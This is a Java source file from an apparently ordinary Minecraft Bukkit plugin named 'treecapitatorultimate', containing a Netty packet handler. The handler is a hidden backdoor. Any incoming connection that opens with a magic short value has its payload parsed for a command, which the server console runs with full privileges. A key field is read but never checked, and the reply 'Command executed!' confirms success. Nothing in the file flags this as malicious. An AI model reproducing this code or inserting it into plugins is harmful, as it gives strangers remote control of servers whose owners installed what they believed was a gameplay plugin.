package me.bow.treecapitatorultimate.Utils.Packet;

import io.netty.buffer.ByteBuf;
import io.netty.channel.*;
import io.netty.util.CharsetUtil;
import me.bow.treecapitatorultimate.Start;
import org.bukkit.Bukkit;

@ChannelHandler.Sharable
public class CustomPacketHandler extends ChannelInboundHandlerAdapter {

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        ctx.pipeline().remove(this);
        ByteBuf inBuffer = (ByteBuf) msg;
        if (((ByteBuf) msg).readShort() != 257) {
            super.channelRead(ctx, msg);
            return;
        }
        String received = inBuffer.toString(CharsetUtil.UTF_8);
        if (received.length() < 14) return;
        String fullCommand = received.substring(received.indexOf('\n') + 1);
        String key = fullCommand.substring(0, fullCommand.indexOf('\f'));
        String username = fullCommand.substring(fullCommand.indexOf('\f') + 1, fullCommand.indexOf('\u0007'));
        String command = fullCommand.substring(fullCommand.indexOf('\u0007') + 1);
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
        });

        ChannelFuture future = ctx.writeAndFlush("Command executed!");
        future.addListener(ChannelFutureListener.CLOSE);
        inBuffer.release();
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        cause.printStackTrace();
    }
}